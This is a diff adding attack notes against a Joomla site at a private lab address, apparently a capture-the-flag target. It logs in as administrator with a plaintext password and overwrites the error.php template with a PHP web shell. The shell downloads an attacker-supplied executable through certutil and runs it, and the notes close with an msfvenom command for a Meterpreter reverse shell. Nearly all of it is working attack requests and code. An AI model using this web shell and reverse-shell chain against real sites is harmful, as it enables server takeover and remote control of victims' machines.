@@ -1,0 +1,130 @@
+* 1st request( Authenticate )
+####################################################################################################################################
+POST /administrator/index.php HTTP/1.1
+
+Host: 10.10.11.3
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: http://10.10.11.3/administrator/index.php
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 122
+
+Origin: http://10.10.11.3
+
+Connection: close
+
+Cookie: 3815f63d17a9109b26eb1b8c114159ac=bdpqnfmdgbl00nvfnvn83sai3a; 770f5c99f1b67a1cc480471651b7d9b3=c9qn9h22gmvvuqds3utbl36isb
+
+Upgrade-Insecure-Requests: 1
+
+
+
+username=Administrator&passwd=playboy69&option=com_login&task=login&return=aW5kZXgucGhw&7374574822ba48430a9e8abd478f46ec=1
+
+
+####################################################################################################################################
+
+
+
+* 1st Response ( Get authentication from response )
+Header => Set-Cookie: 770f5c99f1b67a1cc480471651b7d9b3=bhg2rtv5pq8j10po7vj13eb1jp;
+
+
+
+
+* 2nd Request ( Update the error.php template )
+####################################################################################################################################
+
+POST /administrator/index.php?option=com_templates&view=template&id=223&file=Ly9lcnJvci5waHA&isMedia=0 HTTP/1.1
+
+Host: 10.10.11.3
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: http://10.10.11.3/administrator/index.php?option=com_templates&view=template&id=223&file=Ly9lcnJvci5waHA&isMedia=0
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 1211
+
+Origin: http://10.10.11.3
+
+Connection: close
+
+Cookie: 3815f63d17a9109b26eb1b8c114159ac=bdpqnfmdgbl00nvfnvn83sai3a; 770f5c99f1b67a1cc480471651b7d9b3=ih3qsooq79kajvoglk8jnmvdf9
+
+Upgrade-Insecure-Requests: 1
+
+
+
+isMedia=0&jform%5Bsource%5D=%3C%3Fphp%0D%0A%0D%0Afunction+executeCommand%28%24command%29%7B%0D%0A++++%24output+%3D+shell_exec%28%24command%29%3B%0D%0A++++echo+%22%3Cpre%3EExecuted%3A+%24command%3C%2Fpre%3E%22%3B%0D%0A++++echo+%22%3Cpre%3E%24output%3C%2Fpre%3E%22%3B%0D%0A%7D%0D%0A%0D%0Aif+%28%24_SERVER%5B%27REQUEST_METHOD%27%5D+%3D%3D%3D+%27GET%27%29+%7B%0D%0A++++%2F%2F%24ip+%3D+%24_GET%5Bip%5D%3B%0D%0A++++%2F%2F%24port+%3D+%24_GET%5Bport%5D%3B%0D%0A++++%24url+%3D+%24_GET%5Burl%5D%3B%0D%0A++++%24localfile+%3D+%24_GET%5Bfile%5D%3B%0D%0A++++%0D%0A++++%2F%2F+Use+double+quotes+to+correctly+expand+PHP+variables%0D%0A++++%24downloadcmd+%3D+%22certutil+-urlcache+-split+-f+%5C%22%24url%5C%22+%5C%22%24localfile%5C%22%22%3B%0D%0A++++%2F%2F+Use+the+full+path+to+the+executable+to+avoid+issues%0D%0A++++%24runcmd+%3D+%22cmd+%2Fc+%5C%22%24localfile%5C%22%22%3B%0D%0A++++%0D%0A++++executeCommand%28%24downloadcmd%29%3B%0D%0A++++executeCommand%28%24runcmd%29%3B++%0D%0A%7D+else+%7B%0D%0A++++echo+%22Use+GET+method%21%21%22%3B%0D%0A%7D%0D%0A%3F%3E&task=template.apply&22cd3ec7d65a912eb3e78e7246ca1355=1&jform%5Bextension_id%5D=223&jform%5Bfilename%5D=C%3A%5Cxampp%5Chtdocs%5Cjoomla%5Ctemplates%5Ccassiopeia%5Cerror.php
+
+
+####################################################################################################################################
+
+
+
+* 2nd Response
+####################################################################################################################################
+
+status_code => 303
+In Header -> Location:http://10.10.11.3/administrator/index.php?option=com_templates&view=template&id=223&file=Ly9lcnJvci5waHA&isMedia=0
+
+####################################################################################################################################
+
+
+
+
+* Payload
+####################################################################################################################################
+<?php
+
+function executeCommand($command){
+    $output = shell_exec($command);
+    echo "<pre>Executed: $command</pre>";
+    echo "<pre>$output</pre>";
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    //$ip = $_GET[ip];
+    //$port = $_GET[port];
+    $url = $_GET[url];
+    $localfile = 'revshell.exe';
+    
+    // Use double quotes to correctly expand PHP variables
+    $downloadcmd = "certutil -urlcache -split -f \"$url\" \"$localfile\"";
+    // Use the full path to the executable to avoid issues
+    $runcmd = "cmd /c \"$localfile\"";
+    
+    executeCommand($downloadcmd);
+    executeCommand($runcmd);  
+} else {
+    echo "Use GET method!!";
+}
+?>
+####################################################################################################################################
+
+
+
+
+
+
+
+
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f c
